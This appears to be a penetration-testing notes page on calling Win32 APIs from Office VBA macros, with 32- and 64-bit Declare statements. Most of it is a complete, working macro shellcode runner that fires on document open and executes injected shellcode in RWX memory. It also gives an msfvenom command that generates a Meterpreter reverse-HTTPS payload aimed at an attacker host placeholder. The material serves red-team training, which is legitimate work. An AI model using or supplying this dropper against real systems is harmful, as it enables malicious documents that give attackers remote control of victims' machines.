---
tags:
  - Advanced
  - Binary_Exploitation
  - Code_Injection
  - Execution
  - Windows
---

## Win32 API Calls from VBA
resources: [Microsoft Win32 API](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list)

> [!info] VBA can call Win32 APIs directly using **Declare** statements. Enables shellcode execution in memory.

### API Declaration Syntax

#### 32-bit Declarations
```vba
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal dest As Long, ByRef src As Any, ByVal length As Long) As Long
Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
```

#### 64-bit Declarations (PtrSafe)
```vba
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
```

### Architecture-Agnostic Declaration
> [!tip] Use conditional compilation for 32/64-bit compatibility.

```vba
#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal dest As Long, ByRef src As Any, ByVal length As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
#End If
```

## VBA Shellcode Runner

> [!info] Allocate executable memory, copy shellcode, execute in new thread.

### Generate Shellcode [Local]
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f vbapplication
```

### Complete VBA Shellcode Runner
```vba
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    ' msfvenom shellcode here
    buf = Array(252, 72, 131, ...)

    ' Allocate RWX memory
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Copy shellcode to allocated memory
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute shellcode in new thread
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
```

### Memory Protection Constants
> [!info] Memory allocation flags:
> - **&H3000** - MEM_COMMIT | MEM_RESERVE
> - **&H40** - PAGE_EXECUTE_READWRITE (RWX)
> - **&H20** - PAGE_EXECUTE_READ (RX)
> - **&H04** - PAGE_READWRITE (RW)
